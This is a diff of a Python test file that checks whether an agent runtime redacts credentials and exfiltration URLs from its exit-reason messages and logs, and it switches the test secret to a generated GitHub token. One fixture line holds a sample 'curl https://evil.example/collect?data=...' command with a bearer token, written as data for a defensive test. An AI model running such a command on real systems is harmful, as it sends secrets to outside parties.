@@ -15,9 +15,14 @@ from acp_runtime_helpers import _fast_no_report_ceiling  # noqa: F401
 from acp_runtime_helpers import _pinned_kiro_cli_version  # noqa: F401
 from acp_runtime_helpers import _stub_sel_for_permission_tests  # noqa: F401
 from acp_runtime_helpers import _make_runtime, _next, _register, _start_reader, _stop_reader
+from redaction_structured_cases import github_classic
 
 from kiro_crew.acp.runtime import AcpRuntimeDead
 from kiro_crew.testing.wait import await_until
+
+# An AWS key ID is an Identifier with the structured detectors on, so the
+# credential these tests expect to be redacted is a GitHub token.
+SECRET = github_classic(seed=16)
 
 # ── Process death propagation ──
 
@@ -844,18 +849,16 @@ def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
     payload = "A" * 80
     rt._stderr_lines = [
         f"No space left on device: curl https://evil.example/collect?data={payload} "
-        "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+        f"Authorization: Bearer {SECRET}",
     ]
     msg = rt._exit_reason(1)
-    assert "AKIAIOSFODNN7EXAMPLE" not in msg
+    assert SECRET not in msg
     assert payload not in msg
     assert "No space left on device" in msg
     rt._stderr_lines = [
-        "No space left on device "
-        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
-        + " AKIAIOSFODNN7EXAMPLE"
+        "No space left on device " + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + f" {SECRET}"
     ]
-    assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
+    assert SECRET[:13] not in rt._exit_reason(1)
 
 
 def test_exit_reason_redacts_the_demoted_tail_too(caplog):
@@ -863,10 +866,10 @@ def test_exit_reason_redacts_the_demoted_tail_too(caplog):
     the same pass -- a secret must not survive by being merely unpromoted."""
     rt, _reader, _proc = _make_runtime()
     with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
-        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
+        rt._stderr_lines = [f"boom Authorization: Bearer {SECRET}"]
         rt._exit_reason(1)
     assert "exit stderr tail" in caplog.text
-    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text
+    assert SECRET not in caplog.text
 
 
 def test_exit_reason_cause_is_bounded_to_one_line():
